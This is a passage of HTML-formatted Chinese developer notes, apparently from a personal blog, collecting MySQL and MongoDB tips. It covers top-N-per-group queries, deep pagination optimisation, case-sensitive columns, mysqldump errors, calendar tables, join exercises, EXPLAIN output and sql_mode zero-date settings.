class="number">7</span>	<span class="number">55</span>	<span class="number">6</span>	<span class="number">2019</span><span class="number">-07</span><span class="number">-06</span> <span class="number">19</span>:<span class="number">45</span>:<span class="number">33</span></span><br><span class="line">需求：获取 cs_goods 表中的所有商品，但同一个超市最多只能出现 <span class="number">3</span> 个商品（cs_merchant_id 是超市 id），并用 created_at 进行倒序排列，最后的结果应该是 <span class="number">3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">6</span> <span class="number">7</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"> https:<span class="comment">//learnku.com/laravel/t/31355</span></span><br><span class="line"></span><br><span class="line">原生sql：</span><br><span class="line">SELECT a.* FROM cs_goods a WHERE ( SELECT COUNT(*) FROM cs_goods WHERE cs_merchant_id = a.cs_merchant_id AND id &gt; a.id ) &lt; <span class="number">3</span> ORDER BY a.created_at desc;</span><br><span class="line">SELECT</span><br><span class="line"><span class="string">`a`</span>.* </span><br><span class="line">FROM</span><br><span class="line"><span class="string">`cs_goods`</span> AS <span class="string">`a`</span> </span><br><span class="line">WHERE</span><br><span class="line">( SELECT COUNT(<span class="string">`b`</span>.<span class="string">`id`</span>)  FROM <span class="string">`cs_goods`</span> AS b WHERE <span class="string">`b`</span>.<span class="string">`cs_merchant_id`</span> = <span class="string">`a`</span>.<span class="string">`cs_merchant_id`</span> AND <span class="string">`b`</span>.<span class="string">`created_at`</span> &gt; <span class="string">`a`</span>.<span class="string">`created_at`</span> ) &lt; <span class="number">3</span> </span><br><span class="line">ORDER BY</span><br><span class="line"><span class="string">`a`</span>.<span class="string">`created_at`</span> DESC;</span><br><span class="line">SELECT</span><br><span class="line"><span class="string">`a`</span>.* </span><br><span class="line">FROM</span><br><span class="line"><span class="string">`cs_goods`</span> AS <span class="string">`a`</span></span><br><span class="line">LEFT JOIN <span class="string">`cs_goods`</span> AS <span class="string">`b`</span> ON <span class="string">`a`</span>.<span class="string">`cs_merchant_id`</span> = <span class="string">`b`</span>.<span class="string">`cs_merchant_id`</span> </span><br><span class="line">AND <span class="string">`b`</span>.<span class="string">`created_at`</span> &gt; <span class="string">`a`</span>.<span class="string">`created_at`</span> </span><br><span class="line">GROUP BY</span><br><span class="line"><span class="string">`a`</span>.<span class="string">`id`</span> </span><br><span class="line">HAVING</span><br><span class="line">COUNT( b.id ) &lt; <span class="number">3</span> </span><br><span class="line">ORDER BY</span><br><span class="line"><span class="string">`a`</span>.<span class="string">`created_at`</span> DESC</span><br><span class="line"></span><br><span class="line"> \DB::table(<span class="string">'cs_goods as a'</span>)</span><br><span class="line">        -&gt;select(<span class="string">'a.*'</span>)</span><br><span class="line">        -&gt;leftJoin(<span class="string">'cs_goods as b'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$join</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $join-&gt;on(<span class="string">'a.cs_merchant_id'</span>,<span class="string">'='</span>,<span class="string">'b.cs_merchant_id'</span>)</span><br><span class="line">                -&gt;on(<span class="string">'b.created_at'</span>,<span class="string">'&gt;'</span>,<span class="string">'a.created_at'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        -&gt;groupBy(<span class="string">'a.id'</span>)</span><br><span class="line">        -&gt;havingRaw(<span class="string">'COUNT(b.id) &lt; 3'</span>)</span><br><span class="line">        -&gt;orderByDesc(<span class="string">'a.created_at'</span>)</span><br><span class="line">        -&gt;toSql();</span><br></pre></td></tr></table></figure>
<h3 id="升级mongodb3"><a href="#升级mongodb3" class="headerlink" title="升级mongodb3"></a>升级mongodb3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Server at <span class="number">10.23</span><span class="number">.2</span><span class="number">.1</span>:<span class="number">27017</span> reports wire version <span class="number">2</span>, but <span class="keyword">this</span> version <span class="keyword">of</span> libmongoc requires at least <span class="number">3</span> (MongoDB <span class="number">3.0</span>)   </span><br><span class="line"></span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000004547368</span></span><br><span class="line">curl https:<span class="comment">//fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.0.9.tgz  </span></span><br><span class="line"></span><br><span class="line">tar -xvzf mongodb-linux-x86_64<span class="number">-3.0</span><span class="number">.9</span>.tgz  </span><br><span class="line">cd mongodb-linux-x86_64<span class="number">-3.0</span><span class="number">.9</span></span><br><span class="line">[root@localhost ~]# ps aux|grep mongo</span><br><span class="line">root      <span class="number">6217</span>  <span class="number">0.2</span>  <span class="number">0.3</span> <span class="number">4773512</span> <span class="number">37412</span> ?       Sl   May06 <span class="number">232</span>:<span class="number">35</span> mongod --fork --dbpath=<span class="regexp">/data2/m</span>ongodb --logpath=<span class="regexp">/data2/m</span>ongodb/mongodb.log --logappend</span><br><span class="line">root     <span class="number">28665</span>  <span class="number">0.0</span>  <span class="number">0.0</span> <span class="number">103256</span>   <span class="number">844</span> pts/<span class="number">1</span>    S+   <span class="number">16</span>:<span class="number">19</span>   <span class="number">0</span>:<span class="number">00</span> grep mongo</span><br><span class="line">[root@localhost ~]# kill -9 6217</span><br><span class="line">[root@localhost ~]# /data1/projects/mongodb-linux-x86_64-3.0.9/bin/mongod --fork --dbpath=/data2/mongodb --logpath=/data2/mongodb/mongodb.log --logappend</span><br><span class="line">about to fork child process, waiting until server is ready <span class="keyword">for</span> connections.</span><br><span class="line">forked process: <span class="number">29713</span></span><br><span class="line">child process started successfully, parent exiting</span><br><span class="line">[root@localhost ~]# /data1/projects/mongodb-linux-x86_64-3.0.9/bin/mongo</span><br><span class="line">MongoDB shell version: <span class="number">3.0</span><span class="number">.6</span></span><br><span class="line">connecting to: test</span><br><span class="line">Server has startup warnings:</span><br></pre></td></tr></table></figure>
<h3 id="Mysql-大表分页查询优化"><a href="#Mysql-大表分页查询优化" class="headerlink" title="Mysql 大表分页查询优化"></a>Mysql 大表分页查询优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">select id, content <span class="keyword">from</span> table_name where status = <span class="number">1</span> order by id asc limit <span class="number">1328000</span>, <span class="number">1000</span></span><br><span class="line">执行了 <span class="number">90</span> 秒，扫描了 <span class="number">1329172</span> 行。</span><br><span class="line"></span><br><span class="line">改写成</span><br><span class="line"></span><br><span class="line">select a2.id, a2.content <span class="keyword">from</span> (select id <span class="keyword">from</span> table_name where status = <span class="number">1</span> order by id asc limit <span class="number">1328000</span>, <span class="number">1000</span>) a1, table_name a2 where a1.id=a2.id;</span><br><span class="line"></span><br><span class="line">SELECT * FROM table_name a1 INNER JOIN (SELECT id FROM table_name ORDER BY id LIMIT <span class="number">1328000</span>,<span class="number">1000</span>) a2 ON a1.id=a2.id</span><br><span class="line">select id <span class="keyword">from</span> table_name where id&gt;<span class="number">73575000</span> order by id asc limit <span class="number">0</span>, <span class="number">5000</span></span><br><span class="line">执行时间<span class="number">19.63</span>ms</span><br><span class="line"></span><br><span class="line">select a2.id,a2.keyword,a2.url <span class="keyword">from</span> (select id <span class="keyword">from</span> table_name where id&gt;<span class="number">73575000</span> order by id asc limit <span class="number">0</span>, <span class="number">5000</span>) a1, table_name a2 where a1.id=a2.id</span><br><span class="line">执行时间<span class="number">26.35</span>ms，又可以愉快的玩耍了。</span><br><span class="line"></span><br><span class="line">或者直接</span><br><span class="line"></span><br><span class="line">select id,keyword,url  <span class="keyword">from</span> table_name where id&gt;<span class="number">73575000</span> order by id asc limit <span class="number">0</span>, <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//mengkang.net/1300.html</span></span><br></pre></td></tr></table></figure>
<h3 id="不区分大小写"><a href="#不区分大小写" class="headerlink" title="不区分大小写"></a>不区分大小写</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">insert into tableName(date,workflow,cou) values(<span class="string">'2019-01-04'</span>,<span class="string">'tx'</span>,<span class="number">10000</span>);</span><br><span class="line">insert into tableName(date,workflow,cou) values(<span class="string">'2019-01-04'</span>,<span class="string">'Tx'</span>,<span class="number">100000</span>);</span><br><span class="line"></span><br><span class="line">alter table statistic_daily_workflow_count modify column workflow varchar(<span class="number">170</span>) binary character set utf8 collate utf8_bin;</span><br><span class="line">创建表时字段指定binary</span><br><span class="line">create table PlainText(</span><br><span class="line">Content nvarchar(<span class="number">50</span>) binary,</span><br><span class="line">primary key(Content)</span><br><span class="line">);</span><br><span class="line">修改列指定binary</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">-- 修改列</span><br><span class="line">ALTER TABLE <span class="string">`Md5Data`</span>.<span class="string">`PlainText`</span> </span><br><span class="line">CHANGE COLUMN <span class="string">`Content`</span> <span class="string">`Content`</span> VARCHAR(<span class="number">55</span>) CHARACTER SET <span class="string">'utf8'</span> BINARY NOT NULL DEFAULT <span class="string">''</span> ;</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> usertable where binary id = <span class="string">'A'</span>;</span><br><span class="line">http:<span class="comment">//www.ikeguang.com/2019/01/05/mysql-unique/</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-备份"><a href="#MySQL-备份" class="headerlink" title="MySQL 备份"></a>MySQL 备份</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost mc_orderdb]# mysqldump -ubackup -p --master-data=2 --single-transaction --routines --triggers --events  --tab="/tmp/mc_orderdb"  mc_orderdb</span><br><span class="line">Enter password: </span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Position to start replication or point-<span class="keyword">in</span>-time recovery <span class="keyword">from</span></span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">-- CHANGE MASTER TO MASTER_LOG_FILE=<span class="string">'mysql_bin.000009'</span>, MASTER_LOG_POS=<span class="number">1095</span>;</span><br><span class="line">mysqldump: Got error: <span class="number">1</span>: Can<span class="string">'t create/write to file '</span>/tmp/mc_orderdb/order_cart.txt<span class="string">' (Errcode: 13 - Permission denied) when executing '</span>SELECT INTO OUTFILE<span class="string">'</span></span><br><span class="line"><span class="string">1. 权限问题：chown mysql:mysql mc_orderdb/</span></span><br><span class="line"><span class="string">2. 关闭防火墙selinux</span></span><br><span class="line"><span class="string">　shell&gt;vi /etc/selinux/config</span></span><br><span class="line"><span class="string">           SELINUX=disabled</span></span><br><span class="line"><span class="string">3. shell&gt;setsebool -P mysqld_disable_trans=1</span></span><br></pre></td></tr></table></figure>
<h3 id="groupBy-分组统计"><a href="#groupBy-分组统计" class="headerlink" title="groupBy 分组统计"></a>groupBy 分组统计</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">数据中 <span class="number">4</span> 号～<span class="number">7</span> 号的时间段没有返回，我们理想中的返回格式是补全没有的日期，然后在这个日期对应的数量字段填 <span class="number">0</span>。</span><br><span class="line"></span><br><span class="line">在网上 google 了一下，解决方案是新建一张自期表做主表，左联要统计的表，</span><br><span class="line"></span><br><span class="line">CREATE TABLE num (i int);-- 创建一个表用来储存<span class="number">0</span><span class="number">-9</span>的数字</span><br><span class="line">INSERT INTO num (i) VALUES (<span class="number">0</span>), (<span class="number">1</span>), (<span class="number">2</span>), (<span class="number">3</span>), (<span class="number">4</span>), (<span class="number">5</span>), (<span class="number">6</span>), (<span class="number">7</span>), (<span class="number">8</span>), (<span class="number">9</span>);-- 生成<span class="number">0</span><span class="number">-9</span>的数字，方便以后计算时间</span><br><span class="line"></span><br><span class="line">CREATE TABLE  <span class="keyword">if</span> not exists calendar(datelist date); -- 生成一个存储日期的表，datalist是字段名</span><br><span class="line"></span><br><span class="line">-- 这里是生成并插入日期数据</span><br><span class="line">INSERT INTO calendar(datelist) SELECT</span><br><span class="line">    adddate(</span><br><span class="line">        (   -- 这里的起始日期，你可以换成当前日期</span><br><span class="line">            DATE_FORMAT(<span class="string">"2016-1-1"</span>, <span class="string">'%Y-%m-%d'</span>) </span><br><span class="line">        ),</span><br><span class="line">        numlist.id</span><br><span class="line">    ) AS <span class="string">`date`</span></span><br><span class="line">FROM</span><br><span class="line">    (</span><br><span class="line">        SELECT</span><br><span class="line">            n1.i + n10.i * <span class="number">10</span> + n100.i * <span class="number">100</span> + n1000.i * <span class="number">1000</span>+ n10000.i * <span class="number">10000</span> AS id</span><br><span class="line">        FROM</span><br><span class="line">            num n1</span><br><span class="line">        CROSS JOIN num AS n10</span><br><span class="line">        CROSS JOIN num AS n100</span><br><span class="line">        CROSS JOIN num AS n1000</span><br><span class="line">        CROSS JOIN num AS n10000</span><br><span class="line">    ) AS numlist;</span><br><span class="line">运行 sql 语句后，请删除 num 表</span><br><span class="line">数据库在通过连接两张或多张表来返回记录时，都会生成一张中间的临时表，然后再将这张临时表返回给用户；</span><br><span class="line"></span><br><span class="line">where 条件是在临时表生成好后，再对临时表进行过滤的条件；</span><br><span class="line"></span><br><span class="line">因此：where 条件加上，已经没有 left join 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</span><br><span class="line"></span><br><span class="line">解决方案是把限制条件放在 on 后面</span><br><span class="line"></span><br><span class="line">select a.*,b.*</span><br><span class="line"><span class="keyword">from</span> table1 a</span><br><span class="line">left join table2 b on b.X=a.X and XXX</span><br><span class="line">结论：</span><br><span class="line"></span><br><span class="line">where 后面：是先连接然生成临时查询结果，然后再筛选</span><br><span class="line"></span><br><span class="line">on 后面：先根据条件过滤筛选，再连 生成临时查询结果https:<span class="comment">//learnku.com/articles/26796</span></span><br></pre></td></tr></table></figure>
<h3 id="导入文件"><a href="#导入文件" class="headerlink" title="导入文件"></a>导入文件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">修改 my.cnf [mac]，my.ini.[win],</span><br><span class="line">secure-file-priv=<span class="string">'txt 文本存放的目录'</span></span><br><span class="line">重启 mysql</span><br><span class="line">\t 是 txt 文本中的字段区分，\n 是文本行的结尾，sys_log20190731 表名</span><br><span class="line"><span class="number">80000000.</span>txt 要放到你给权限的目录的下，secure-file-priv=<span class="string">'txt 文本存放的目录'</span></span><br><span class="line">load data infile <span class="string">'mypath/80000000.txt'</span> ignore into table sys_log20190731 character set gbk fields terminated by <span class="string">'\t'</span> enclosed by <span class="string">'"'</span> lines terminated by <span class="string">'\n'</span> (<span class="string">`field1`</span>,<span class="string">`field2`</span>,<span class="string">`field3`</span>,<span class="string">`field4`</span>,<span class="string">`field5`</span>,<span class="string">`field6`</span>,<span class="string">`field7`</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/31979</span></span><br></pre></td></tr></table></figure>
<h3 id="关联查询"><a href="#关联查询" class="headerlink" title="关联查询"></a>关联查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">内连接分为三类</span><br><span class="line">    - 等值连接：on a.id = b.id</span><br><span class="line">    - 不等值连接：on a.id &gt; b.id</span><br><span class="line">    - 自连接：select * <span class="keyword">from</span> a t1 inner join a t2 on t1.id = t2.id</span><br><span class="line">  <span class="comment">//创建student表，并插入测试数据</span></span><br><span class="line">  create table student(</span><br><span class="line">  id int unsigned primary key auto_increment,</span><br><span class="line">  name char(<span class="number">10</span>) not <span class="literal">null</span></span><br><span class="line">  );</span><br><span class="line">  insert into student(name) values(<span class="string">'小明'</span>),(<span class="string">'小红'</span>);</span><br><span class="line">  <span class="comment">//创建course表，并插入测试数据</span></span><br><span class="line">  create table course(</span><br><span class="line">  id int unsigned primary key auto_increment,</span><br><span class="line">  name char(<span class="number">20</span>) not <span class="literal">null</span></span><br><span class="line">  );</span><br><span class="line">  insert into course(name) values(<span class="string">'PHP'</span>),(<span class="string">'JAVA'</span>);</span><br><span class="line">  <span class="comment">//创建student_course表，并插入测试数据</span></span><br><span class="line">  create table student_course(</span><br><span class="line">  sid int unsigned,</span><br><span class="line">  cid int unsigned,</span><br><span class="line">  score int unsigned not <span class="literal">null</span>,</span><br><span class="line">  foreign key (sid) references student(id),</span><br><span class="line">  foreign key (cid) references course(id),</span><br><span class="line">  primary key(sid, cid)</span><br><span class="line">  );</span><br><span class="line">  insert into student_course values(<span class="number">1</span>,<span class="number">1</span>,<span class="number">80</span>),(<span class="number">1</span>,<span class="number">2</span>,<span class="number">90</span>),(<span class="number">2</span>,<span class="number">1</span>,<span class="number">90</span>),(<span class="number">2</span>,<span class="number">2</span>,<span class="number">70</span>);  </span><br><span class="line">    查询 student 表中重名的学生，结果包含 id 和 name，按 name 升序</span><br><span class="line">    </span><br><span class="line">    select id,name</span><br><span class="line">    <span class="keyword">from</span> student</span><br><span class="line">    where name <span class="keyword">in</span> (</span><br><span class="line">    select name <span class="keyword">from</span> student group by name having(count(*) &gt; <span class="number">1</span>)</span><br><span class="line">    ) order by name ASC;</span><br><span class="line">    查询每个学生的总成绩，结果列出学生姓名和总成绩。</span><br><span class="line">    </span><br><span class="line">    select name,sum(score)</span><br><span class="line">    <span class="keyword">from</span> student left join student_course</span><br><span class="line">    on student.id=student_course.sid</span><br><span class="line">    group by sid;</span><br><span class="line">    +------+------------+</span><br><span class="line">    | name | sum(score) |</span><br><span class="line">    +------+------------+</span><br><span class="line">    | ???  |        <span class="number">170</span> |</span><br><span class="line">    | ??   |        <span class="number">160</span> |</span><br><span class="line">    </span><br><span class="line">    在 student_course 表查询各科成绩最高的学生，结果列出学生 id、课程 id 和对应的成绩</span><br><span class="line">    </span><br><span class="line">    select * <span class="keyword">from</span> student_course <span class="keyword">as</span> x where score&gt;=</span><br><span class="line">    (select max(score) <span class="keyword">from</span> student_course <span class="keyword">as</span> y where cid=x.cid);</span><br><span class="line">    +-----+-----+-------+</span><br><span class="line">    | sid | cid | score |</span><br><span class="line">    +-----+-----+-------+</span><br><span class="line">    |   <span class="number">1</span> |   <span class="number">2</span> |    <span class="number">90</span> |</span><br><span class="line">    |   <span class="number">2</span> |   <span class="number">1</span> |    <span class="number">90</span> |</span><br><span class="line">    +-----+-----+-------+</span><br><span class="line">    在 student_course 表中查询每门课成绩都不低于 <span class="number">80</span> 的学生 id</span><br><span class="line">    </span><br><span class="line">    select distinct sid</span><br><span class="line">    <span class="keyword">from</span> student_course</span><br><span class="line">    where sid not <span class="keyword">in</span> (</span><br><span class="line">    select sid <span class="keyword">from</span> student_course</span><br><span class="line">    where score &lt; <span class="number">80</span>);</span><br><span class="line">    +-----+</span><br><span class="line">    | sid |</span><br><span class="line">    +-----+</span><br><span class="line">    |   <span class="number">1</span> |</span><br><span class="line">    +-----+</span><br><span class="line">    https:<span class="comment">//learnku.com/articles/32039</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL大数据分页"><a href="#MySQL大数据分页" class="headerlink" title="MySQL大数据分页"></a>MySQL大数据分页</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM test where status = <span class="number">1</span> limit start, <span class="number">1000</span></span><br><span class="line">select * <span class="keyword">from</span> test a , </span><br><span class="line">    (select id <span class="keyword">from</span> test where status = <span class="number">1</span> limit <span class="number">300000</span>, <span class="number">10</span>) b </span><br><span class="line">    where a.id  = b.id;</span><br><span class="line">---</span><br><span class="line"><span class="number">10</span> rows <span class="keyword">in</span> set (<span class="number">0.06</span> sec)</span><br><span class="line">select * <span class="keyword">from</span> test </span><br><span class="line">    inner join (select id <span class="keyword">from</span> test  limit <span class="number">300000</span>, <span class="number">10</span>) t2 </span><br><span class="line">    using (id);</span><br><span class="line">---</span><br><span class="line"><span class="number">10</span> rows <span class="keyword">in</span> set (<span class="number">0.06</span> sec)</span><br><span class="line">select * <span class="keyword">from</span> test </span><br><span class="line">    where status = <span class="number">1</span> and id &gt; xxx</span><br><span class="line">    order by id asc</span><br><span class="line">    limit <span class="number">10</span></span><br><span class="line">---</span><br><span class="line"><span class="number">10</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">https:<span class="comment">//blog.jiaojie.site/_posts/2017/12/22/mysql-pagination-tips/</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-索引使用策略及优化"><a href="#MySQL-索引使用策略及优化" class="headerlink" title="MySQL 索引使用策略及优化"></a>MySQL 索引使用策略及优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MySQL 的优化主要分为结构优化（Scheme optimization）和查询优化（Query optimization）。</span><br><span class="line">从 https:<span class="comment">//github.com/datacharmer/test_db 倒入 employees.sql 文件</span></span><br><span class="line">EXPLAIN 出来的信息有 <span class="number">10</span> 列，分别是 id、select_type、table、type、possible_keys、key、key_len、ref、rows、Extra</span><br><span class="line">概要描述：</span><br><span class="line"></span><br><span class="line">id: 选择标识符</span><br><span class="line">select_type: 表示查询的类型。</span><br><span class="line">table: 输出结果集的表</span><br><span class="line">type: 表示表的连接类型</span><br><span class="line">all（全表扫描） 、index（按照索引顺序的全表扫描）、range (有范围的索引扫描)</span><br><span class="line">req (查找条件列使用了索引而且不为主键和 unique, 使用该索引列的值并不唯一)、ref_eq（使用了主键或者唯一性索引进行查找的情况）、</span><br><span class="line"><span class="keyword">const</span>（主键放置到 where 后面作为条件查询，mysql 优化器就能把这次查询优化转化为一个常量）</span><br><span class="line">possible_keys: 表示查询时，可能使用的索引</span><br><span class="line">key: 表示实际使用的索引</span><br><span class="line">key_len: 索引字段的长度</span><br><span class="line">ref: 列与索引的比较</span><br><span class="line">rows: 扫描出的行数 (估算的行数)</span><br><span class="line">Extra: 执行情况的描述和说明</span><br><span class="line"></span><br><span class="line">不建议建索引的情况是索引的选择性较低。所谓索引的选择性（Selectivity），是指不重复的索引值（也叫基数，Cardinality）与表记录数（#T）的比值：</span><br><span class="line"></span><br><span class="line">Index Selectivity = Cardinality / #T</span><br><span class="line">显然选择性的取值范围为 (<span class="number">0</span>, <span class="number">1</span>]，选择性越高的索引价值越大，这是由 B+Tree 的性质决定的</span><br><span class="line">select count(distinct title)/count(*) <span class="keyword">from</span> table ; https:<span class="comment">//learnku.com/articles/32225</span></span><br></pre></td></tr></table></figure>
<h3 id="datetime-默认值为‘0000-00-00-00-00-00’值无法创建"><a href="#datetime-默认值为‘0000-00-00-00-00-00’值无法创建" class="headerlink" title="datetime 默认值为‘0000-00-00 00:00:00’值无法创建"></a>datetime 默认值为‘0000-00-00 00:00:00’值无法创建</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">使用root登陆数据库 命令界面执行</span><br><span class="line">select @@sql_mode;</span><br><span class="line"> 结果中包含下面两个</span><br><span class="line">NO_ZERO_IN_DATE,NO_ZERO_DATE</span><br><span class="line"><span class="number">2</span>、修改/etc/my.cnf，查找sql_model如果找不到则添加如下代码 </span><br><span class="line">sql_mode=<span class="string">"ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"</span></span><br><span class="line"><span class="number">3</span>、重启mysql</span><br><span class="line">/etc/ini.d/mysql restart</span><br><span class="line">简单几步大功告成！</span><br><span class="line"> </span><br><span class="line">原因：</span><br><span class="line">NO_ZERO_IN_DATE,NO_ZERO_DATE是无法默认为‘<span class="number">0000</span><span class="number">-00</span><span class="number">-00</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>’的根源。</span><br><span class="line">NO_ZERO_IN_DATE：在严格模式下，不允许日期和月份为零 </span><br><span class="line">NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。</span><br></pre></td></tr></table></figure>
